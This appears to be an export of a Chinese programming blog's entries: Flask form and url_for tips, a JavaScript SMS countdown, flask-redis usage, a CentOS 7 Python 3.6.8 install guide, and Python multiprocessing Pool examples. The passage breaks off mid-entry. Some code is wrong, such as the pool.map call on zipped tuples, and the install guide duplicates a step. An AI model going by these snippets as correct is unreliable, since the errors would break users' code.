<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask validate_on_submit always False,flask表单验证总是false解决办法</title>
    <url>/2019/05/02/flask-validate-false/</url>
    <content><![CDATA[<p> Flask validate_on_submit always False,flask表单验证总是false解决办法<br><a id="more"></a></p>
<h1 id="form表单错误判断"><a href="#form表单错误判断" class="headerlink" title="form表单错误判断"></a>form表单错误判断</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if form.errors %&#125;</span><br><span class="line">&#123;&#123; form.errors &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CSRF的字段"><a href="#CSRF的字段" class="headerlink" title="CSRF的字段"></a>CSRF的字段</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; form.csrf_token &#125;&#125;</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>表单验证</tag>
      </tags>
  </entry>
  <entry>
    <title>js实现注册登录发送短信验证码动态显示60S倒计时</title>
    <url>/2019/05/02/js-login/</url>
    <content><![CDATA[<p>js实现注册登录发送短信验证码动态显示60S倒计时<br><a id="more"></a></p>
<h1 id="前端表单"><a href="#前端表单" class="headerlink" title="前端表单"></a>前端表单</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;col-xs-6 col-sm-7 col-md-7 col-lg-7&quot; &gt;</span><br><span class="line">       &lt;input type=&quot;text&quot;  id=&quot;userPhone&quot; class=&quot;form-control&quot; placeholder=&quot;请输入手机号码&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;col-xs-6 col-sm-5 col-md-5 col-lg-5&quot; style=&quot;justify-content:flex-end;display: flex;&quot;&gt;</span><br><span class="line">       &lt;button type=&quot;button&quot; class=&quot;btn btn-info&quot;  id=&quot;second&quot;&gt;点击获取验证码&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;securityCode&quot; class=&quot;form-control&quot;  placeholder=&quot;请输入验证码&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h1 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        $(<span class="string">"#second"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> phone = $(<span class="string">"#userPhone"</span>).val();</span><br><span class="line">            <span class="keyword">var</span> result = isPhoneNum();</span><br><span class="line">            <span class="keyword">if</span>(result) &#123;</span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    url:<span class="string">"http://localhost:8085/my/sendYzm"</span>,</span><br><span class="line">                    data:&#123;<span class="attr">phone</span>:phone&#125;,</span><br><span class="line">                    dataType:<span class="string">"json"</span>,</span><br><span class="line">                    type:<span class="string">"post"</span>,</span><br><span class="line">                    <span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">                    cache : <span class="literal">false</span>,</span><br><span class="line">                    success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">debugger</span>;</span><br><span class="line">                        <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                            alert(<span class="string">"验证码发送成功"</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        alert(<span class="string">"验证码发送失败"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                setTime(obj);<span class="comment">//开始倒计时</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">       </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//60s倒计时实现逻辑</span></span><br><span class="line">        <span class="keyword">var</span> countdown = <span class="number">60</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (countdown == <span class="number">0</span>) &#123;</span><br><span class="line">                obj.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</span><br><span class="line">                obj.text(<span class="string">"点击获取验证码"</span>);</span><br><span class="line">                countdown = <span class="number">60</span>;<span class="comment">//60秒过后button上的文字初始化,计时器初始化;</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                obj.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</span><br><span class="line">                obj.text(<span class="string">"("</span>+countdown+<span class="string">"s)后重新发送"</span>) ;</span><br><span class="line">                countdown--;</span><br><span class="line">            &#125;</span><br><span class="line">            setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; setTime(obj) &#125;,<span class="number">1000</span>) <span class="comment">//每1000毫秒执行一次</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//校验手机号是否合法</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">isPhoneNum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> phonenum = $(<span class="string">"#userPhone"</span>).val();</span><br><span class="line">            <span class="keyword">var</span> reg = <span class="regexp">/^(((13[0-9]&#123;1&#125;)|(15[0-9]&#123;1&#125;)|(18[0-9]&#123;1&#125;))+\d&#123;8&#125;)$/</span>;</span><br><span class="line">            <span class="keyword">if</span>(!reg.test(phonenum))&#123;</span><br><span class="line">                alert(<span class="string">'请输入有效的手机号码！'</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js发送邮件短信</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-redis用法说明</title>
    <url>/2019/05/02/flask-redis/</url>
    <content><![CDATA[<p>flask-redis说明教程<br><a id="more"></a></p>
<h1 id="redis优势"><a href="#redis优势" class="headerlink" title="redis优势"></a>redis优势</h1><p>Redis 优势</p>
<ul>
<li>性能极⾼ – 内存型数据库,读写速度极快</li>
<li>丰富的数据类型 – ⽀持存储 Strings, Lists, Hashes, Sets 及 Ordered Sets 等多种数据类型。</li>
<li>数据持久化 – 可以将内存数据保存到磁盘中, 并提供多种存储机制。</li>
<li>数据备份 – ⽀持主从模式 (master - slave) 的数据备份。</li>
<li>丰富的特性 – 设置过期时间, 发布/订阅, 通知等机制。</li>
</ul>
<h1 id="redis常用的地方"><a href="#redis常用的地方" class="headerlink" title="redis常用的地方"></a>redis常用的地方</h1><ul>
<li>session存储 (性能更好, ⽅便设置过期时间)</li>
<li>购物⻋ (以请求令牌token作为key，记录当前⽤户购物⻋中的商品及其数量)</li>
<li>⽹⻚缓存 (将 请求的url/返回的⽹⻚内容 作为redis的key/value进⾏缓存)</li>
</ul>
<h1 id="flask使用redis"><a href="#flask使用redis" class="headerlink" title="flask使用redis"></a>flask使用redis</h1><ol>
<li><code>pip install flask-redis</code></li>
<li>初始化<code>app建立后 from flask_redis import FlaskRedis rd = FlaskRedis(app)</code></li>
<li>配置文件<code>REDIS_URL=&#39;redis://127.0.0.1:6379/0&#39;</code> 指定你的数据库</li>
<li>使用 <code>from * import rd rd.set(email, str(random_sample))</code></li>
</ol>
<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rs.set(&apos;name&apos;,&apos;zs&apos;)</span><br><span class="line">print(rs.get(&apos;name&apos;))</span><br><span class="line"></span><br><span class="line">rs.mset(&#123;&apos;name&apos;:&apos;ls&apos;,&apos;age&apos;:18&#125;)</span><br><span class="line">print(rs.mget([&apos;name&apos;,&apos;age&apos;]))</span><br><span class="line"></span><br><span class="line">rs.append(&apos;name&apos;,&apos;hh&apos;)</span><br><span class="line">print(rs.mget([&apos;name&apos;,&apos;age&apos;]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rs.delete(&apos;name&apos;)</span><br><span class="line">print(rs.exists(&apos;name&apos;))</span><br><span class="line">rs.expire(&apos;age&apos;,20)</span><br><span class="line">print(rs.ttl(&apos;age&apos;))</span><br><span class="line">print(rs.type(&apos;age&apos;))</span><br><span class="line">print(rs.keys(&apos;a*&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hash操作命令</span><br><span class="line">rs.hset(&apos;zs&apos;,&apos;name&apos;,&apos;zhangsan&apos;)</span><br><span class="line">print(rs.hget(&apos;zs&apos;,&apos;name&apos;))</span><br><span class="line"></span><br><span class="line">rs.hmset(&apos;zs&apos;,&#123;&apos;name&apos;:&apos;lisi&apos;,&apos;age&apos;:18&#125;)</span><br><span class="line">print(rs.hmget(&apos;zs&apos;,[&apos;name&apos;,&apos;age&apos;]))</span><br><span class="line"></span><br><span class="line">print(rs.keys(&apos;zs&apos;))</span><br><span class="line">print(rs.hvals(&apos;zs&apos;))</span><br><span class="line"></span><br><span class="line">rs.hdel(&apos;zs&apos;,&apos;age&apos;)</span><br><span class="line">print(rs.keys(&apos;zs&apos;))</span><br><span class="line">print(rs.hvals(&apos;zs&apos;))</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-redis</tag>
      </tags>
  </entry>
  <entry>
    <title>flask的url_for用法说明，模板中url_for加参数</title>
    <url>/2019/05/02/url-for/</url>
    <content><![CDATA[<p>flask的url_for用法说明<br><a id="more"></a></p>
<h1 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h1><p><code>from flask import url_for</code></p>
<h1 id="get请求处理和参数传递"><a href="#get请求处理和参数传递" class="headerlink" title="get请求处理和参数传递"></a>get请求处理和参数传递</h1><ul>
<li>get请求暴露在url中，例如: <a href="http://www.baidu.com?a=username&amp;b=password" target="_blank" rel="noopener">www.baidu.com?a=username&amp;b=password</a></li>
<li>第一个参数与网址用 ‘？’ 隔开，参数之间的连接用 ‘&amp;‘</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后端获取参数</span><br><span class="line">@main.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    u = current_user()</span><br><span class="line">    board_id = request.args.get(&apos;username&apos;, &apos;password&apos;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模板传递参数</span><br><span class="line">&lt;a href=&quot;&#123;&#123; url_for(&apos;topic.index&apos;) &#125;&#125;?board_id=&#123;&#123; b.id &#125;&#125;&quot;</span><br><span class="line">    class=&quot;topic-tab current-tab&quot;&gt;&#123;&#123; b.title &#125;&#125;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h1 id="动态参数传递"><a href="#动态参数传递" class="headerlink" title="动态参数传递"></a>动态参数传递</h1><ul>
<li>动态 url <a href="http://www.mamengli.com/topic/user/id" target="_blank" rel="noopener">www.mamengli.com/topic/user/id</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后端获取参数</span><br><span class="line">@main.route(&apos;/user/&lt;string:id&gt;&apos;)</span><br><span class="line">def user(id):</span><br><span class="line">    u = User.one(id=id)</span><br><span class="line">    topicss = User.topics(u.id)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模板传递参数</span><br><span class="line">&lt;a href=&quot;&#123;&#123; url_for(&apos;index.user&apos;,id= user.id ) &#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>url_for</tag>
      </tags>
  </entry>
  <entry>
    <title>学IT必备资源网,全网资源一网打尽</title>
    <url>/2019/04/23/resource/</url>
    <content><![CDATA[<p>学IT必备网站推荐<br><a id="more"></a></p>
<h1 id="我爱IT网"><a href="#我爱IT网" class="headerlink" title="我爱IT网"></a>我爱IT网</h1><p><code>http://www.52studyit.com</code></p>
<p><a href="https://t.me/secretofbody" target="_blank" rel="noopener">https://t.me/secretofbody</a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>资源分享</category>
      </categories>
      <tags>
        <tag>52IT网</tag>
      </tags>
  </entry>
  <entry>
    <title>ImportError: cannot import name app解决办法，循环依赖解决</title>
    <url>/2019/04/22/flask-not-app/</url>
    <content><![CDATA[<p>“ImportError: cannot import name app产生循环依赖”<br><a id="more"></a></p>
<h1 id="有时我们会遇到这样的问题"><a href="#有时我们会遇到这样的问题" class="headerlink" title="有时我们会遇到这样的问题"></a>有时我们会遇到这样的问题</h1><p><code>ImportError: cannot import name app</code><br>或者<br><code>ImportError: cannot import name db</code></p>
<h1 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h1><p>互相引用产生的循环依赖，比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># views.py中</span></span><br><span class="line"><span class="keyword">from</span> .databases <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="comment"># datebases.py中</span></span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> app</span><br></pre></td></tr></table></figure>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>在views.py中一定在实例化Flask之后再导入其他的变量或者函数<br><code>app=Flask(__name__)</code></p>
<h1 id="蓝图注册模块"><a href="#蓝图注册模块" class="headerlink" title="蓝图注册模块"></a>蓝图注册模块</h1><p>把引用放到工厂函数里面去，像下面这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 注册模块</span></span><br><span class="line">    <span class="keyword">from</span> web.security.views <span class="keyword">import</span> security</span><br><span class="line"></span><br><span class="line">    app.register_blueprint(security, url_prefix=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装python3.6.8，安装pip，centos7的virtualenv和mkvirtualenv安装,pip换aliyun源</title>
    <url>/2019/04/20/centos7-python3-6-8/</url>
    <content><![CDATA[<p>终于总结好了！！<br><a id="more"></a></p>
<h1 id="安装前环境依赖包安装"><a href="#安装前环境依赖包安装" class="headerlink" title="安装前环境依赖包安装"></a>安装前环境依赖包安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum groupinstall &apos;Development Tools&apos;</span><br><span class="line">yum install openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel sqlite-devel</span><br><span class="line">yum install wget</span><br></pre></td></tr></table></figure>
<h1 id="移除原来的python2-7-5"><a href="#移除原来的python2-7-5" class="headerlink" title="移除原来的python2.7.5"></a>移除原来的python2.7.5</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#操作路径 /usr/bin</span><br><span class="line">mv python python.bak</span><br></pre></td></tr></table></figure>
<h1 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#操作路径 /usr/bin</span><br><span class="line">mv python python.bak</span><br></pre></td></tr></table></figure>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#操作路径 /usr/local</span><br><span class="line">wget https://www.python.org/ftp/python/3.6.8/Python-3.6.8.tgz</span><br></pre></td></tr></table></figure>
<h2 id="注意-这里可以本地下载在上传"><a href="#注意-这里可以本地下载在上传" class="headerlink" title="注意 这里可以本地下载在上传"></a>注意 这里可以本地下载在上传</h2><h1 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h1><p><code>tar -zxvf Python-3.6.8.tgz</code></p>
<h1 id="编译安装环境"><a href="#编译安装环境" class="headerlink" title="编译安装环境"></a>编译安装环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#操作路径 /usr/local/Python-3.6.8/</span><br><span class="line">./configure --prefix=/usr/local/python/python3</span><br></pre></td></tr></table></figure>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#操作路径要在/usr/local/Python-3.6.8</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<h2 id="遇到错误zipimport-ZipImportError-can’t-decompress-data"><a href="#遇到错误zipimport-ZipImportError-can’t-decompress-data" class="headerlink" title="遇到错误zipimport.ZipImportError: can’t decompress data"></a>遇到错误zipimport.ZipImportError: can’t decompress data</h2><p>解决办法</p>
<ol>
<li><code>yum -y install zlib*</code></li>
<li>进入 python安装包,修改Module路径的setup文件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#zlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz</span><br><span class="line">去掉注释</span><br><span class="line"> zlib zlibmodule.c -I$(prefix)/include -L$(exec_prefix)/lib -lz</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="python命令绑定"><a href="#python命令绑定" class="headerlink" title="python命令绑定"></a>python命令绑定</h1><p><code>ln -s /usr/local/python/python3/bin/python3 /usr/bin/python</code></p>
<h1 id="pip绑定"><a href="#pip绑定" class="headerlink" title="pip绑定"></a>pip绑定</h1><p><code>ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip</code></p>
<h1 id="virtualenv和mkvirtualenv"><a href="#virtualenv和mkvirtualenv" class="headerlink" title="virtualenv和mkvirtualenv"></a>virtualenv和mkvirtualenv</h1><p><code>pip install virtualenv</code></p>
<p><code>pip install virtualenvwrapper</code></p>
<h2 id="遇到问题distutils-errors-DistutilsError-Could-not-find-suitable-distribution-for-Requirement-parse-‘pbr’"><a href="#遇到问题distutils-errors-DistutilsError-Could-not-find-suitable-distribution-for-Requirement-parse-‘pbr’" class="headerlink" title="遇到问题distutils.errors.DistutilsError: Could not find suitable distribution for Requirement.parse(‘pbr’)"></a>遇到问题distutils.errors.DistutilsError: Could not find suitable distribution for Requirement.parse(‘pbr’)</h2><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p><code>pip install pbr</code><br><code>pip install stevedore</code></p>
<h2 id="链接virtualenv"><a href="#链接virtualenv" class="headerlink" title="链接virtualenv"></a>链接virtualenv</h2><p><code>ln -s /usr/local/python/python3/bin/virtualenv /usr/bin/virtualenv</code></p>
<h2 id="配置mkvirtualenv"><a href="#配置mkvirtualenv" class="headerlink" title="配置mkvirtualenv"></a>配置mkvirtualenv</h2><p>创建虚拟环境管理目录<br>mkdir ~/.virtualenvs</p>
<p>打开.bashrc<br>vim ~/.bashrc</p>
<p>在.bashrc的末尾增加下面内容<br>export WORKON_HOME=$HOME/.virtualenvs # 所有虚拟环境存储的目录<br>source /usr/local/python/python3/bin/virtualenvwrapper.sh</p>
<p>启用配置文件<br>source ~/.bashrc </p>
<h1 id="最后创建虚拟环境"><a href="#最后创建虚拟环境" class="headerlink" title="最后创建虚拟环境"></a>最后创建虚拟环境</h1><p><code>mkvirtualenv + name</code></p>
<h1 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h1><p>修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)<br>输入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim  ~/.pip/pip.conf </span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple </span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>export VIRTUALENVWRAPPER_PYTHON=/usr/local/python/python3</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/02/mysql-1/">CentOS 7 下 Yum 安装 MySQL 5.7</a></li></ul></div>]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>centos7</tag>
      </tags>
  </entry>
  <entry>
    <title>python多进程的pool的apply和apply_async用法</title>
    <url>/2019/04/18/pool-apply/</url>
    <content><![CDATA[<p>pool的apply和apply_async用法示例<br><a id="more"></a></p>
<h1 id="为什么用python的多进程"><a href="#为什么用python的多进程" class="headerlink" title="为什么用python的多进程"></a>为什么用python的多进程</h1><p>python的线程会有线程琐，只能利用一个核，所以我们为了提高效率使用python多进程</p>
<h1 id="apply示例"><a href="#apply示例" class="headerlink" title="apply示例"></a>apply示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def work(x):</span><br><span class="line">    print(&quot;&#123;&#125;------&#123;&#125;&quot;.format(x, os.getpid()))</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    print(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    p = Pool(4)              # start 4 worker processes</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    for i in range(10):</span><br><span class="line">        p.apply(work, args=(i,))  </span><br><span class="line">    print(&apos;done&apos;)</span><br><span class="line">    p.close()  # 关闭pool，不接受新任务</span><br><span class="line">    p.join()  # 主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用</span><br></pre></td></tr></table></figure>
<p>apply是阻塞的，每次执行完成才会执行下一次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 0------22548</span><br><span class="line"># 1------21116</span><br><span class="line"># 2------23740</span><br><span class="line"># 3------5788</span><br><span class="line"># end</span><br><span class="line"># 4------22548</span><br><span class="line"># end</span><br><span class="line"># 5------21116</span><br><span class="line"># end</span><br><span class="line"># 6------23740</span><br><span class="line"># end</span><br><span class="line"># 7------5788</span><br><span class="line"># end</span><br><span class="line"># 8------22548</span><br><span class="line"># end</span><br><span class="line"># 9------21116</span><br><span class="line"># end</span><br><span class="line"># end</span><br><span class="line"># end</span><br><span class="line"># end</span><br></pre></td></tr></table></figure>
<p>总结：效率比较低</p>
<h1 id="apply-async"><a href="#apply-async" class="headerlink" title="apply_async"></a>apply_async</h1><p>apply_async是异步的，非阻塞的<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125;------&#123;&#125;"</span>.format(x, os.getpid()))</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'end'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pool(<span class="number">4</span>)              <span class="comment"># start 4 worker processes</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">       </span><br><span class="line">        p.apply_async(work, args=(i,))  <span class="comment"># 异步高效</span></span><br><span class="line">    print(<span class="string">'done'</span>)</span><br><span class="line">    p.close()  <span class="comment"># 关闭pool，不接受新任务</span></span><br><span class="line">    p.join()  <span class="comment"># 主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0------19024</span><br><span class="line">end</span><br><span class="line">1------20216</span><br><span class="line">end</span><br><span class="line">2------4160</span><br><span class="line">end</span><br><span class="line">3------8796</span><br><span class="line">end</span><br><span class="line">4------19024</span><br><span class="line">end</span><br><span class="line">5------20216</span><br><span class="line">end</span><br><span class="line">6------4160</span><br><span class="line">end</span><br><span class="line">7------8796</span><br><span class="line">end</span><br><span class="line">8------19024</span><br><span class="line">end</span><br><span class="line">9------20216</span><br><span class="line">end</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>多进程pool</tag>
      </tags>
  </entry>
  <entry>
    <title>python多进程的pool的map用法，map的多参数解决办法</title>
    <url>/2019/04/17/pool-map/</url>
    <content><![CDATA[<p>pool的map用法<br><a id="more"></a></p>
<h1 id="多参数解决办法"><a href="#多参数解决办法" class="headerlink" title="多参数解决办法"></a>多参数解决办法</h1><p>已下函数使用pool的map</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def work(x, y):</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure>
<p>遇到这种情况我们有一下几种处理方法：</p>
<h1 id="用partial函数提取主要的一个参数固定其他参数"><a href="#用partial函数提取主要的一个参数固定其他参数" class="headerlink" title="用partial函数提取主要的一个参数固定其他参数"></a>用partial函数提取主要的一个参数固定其他参数</h1><p>比如，我们想用x去加一个固定值，那么我们就认为x是主要参数，固定y：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from functools import partial</span><br><span class="line"></span><br><span class="line">partial_work = partial(work, y=1) # 提取x作为partial函数的输入变量,y也是一个循环的变量</span><br><span class="line">results = pool.map(partial_work, x)</span><br></pre></td></tr></table></figure></p>
<h1 id="将多个输入变量打包到一个参数"><a href="#将多个输入变量打包到一个参数" class="headerlink" title="将多个输入变量打包到一个参数"></a>将多个输入变量打包到一个参数</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = [1,2,3,4,5,6]</span><br><span class="line">y = [1,1,1,1,1,1]</span><br><span class="line">x_y = zip(x, y)</span><br><span class="line">results = pool.map(work, x_y)</span><br></pre></td></tr></table></figure>
